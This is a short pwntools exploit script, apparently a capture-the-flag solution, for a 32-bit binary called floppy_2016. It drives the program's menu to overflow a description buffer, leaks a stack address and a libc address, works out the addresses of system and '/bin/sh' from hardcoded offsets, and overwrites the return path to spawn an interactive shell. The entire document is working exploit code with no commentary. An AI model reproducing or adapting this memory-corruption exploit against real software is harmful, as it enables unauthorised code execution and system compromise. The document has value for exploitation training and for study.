from pwn import *

context.binary = "./floppy_2016"
binary = ELF("./floppy_2016")
p = process(["./floppy_2016"])

def choice_floppy(fc):
    p.recvuntil(">")
    p.sendline("1")
    p.recvuntil("1 or 2?\n")
    p.sendline(str(fc))

def Write(data, des):
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil("data: \n")
    p.send(data)
    p.recvuntil("Description: \n")
    p.send(des)

def Read():
    p.recvuntil(">")
    p.sendline("3")

def Modify(fc, msg):
    p.recvuntil(">")
    p.sendline("4")
    p.recvuntil("2 Data\n")
    p.sendline(str(fc))
    if fc == 1:
        p.recvuntil("tion: \n")
        p.send(msg)
    if fc == 2:
        p.recvuntil("Data: ")
        p.send(msg)

choice_floppy(1)
Write("A" * 0x200, "B" * 10)
Modify(1, "b" * 16 + "c" * 20)
choice_floppy(1)
Read()
p.recvuntil("b" * 16)
stack = u32(p.recv(4))
log.info("stack : " + hex(stack))
choice_floppy(2)
Write("C" * 0x200, "D" * 10)
Modify(1, "b" * 20 + p32(stack + 0x38) + p32(0xdeadbeef))
choice_floppy(1)
Read()
p.recvuntil("DATA: ")
libc = u32(p.recv(4))
libc_base = libc - 0x18637
system = libc_base + 0x3ada0
binsh = libc_base + 0x15b9ab
log.info("libc : " + hex(libc))
choice_floppy(2)
Modify(1, "b" * 20 + p32(stack) + p32(0xdeadbeef))
choice_floppy(1)
Modify(2, "q" * 0x1c + p32(stack + 0x24) + p32(system) + p32(0xdeadbeef) + p32(binsh))
p.sendline("5")

p.interactive()
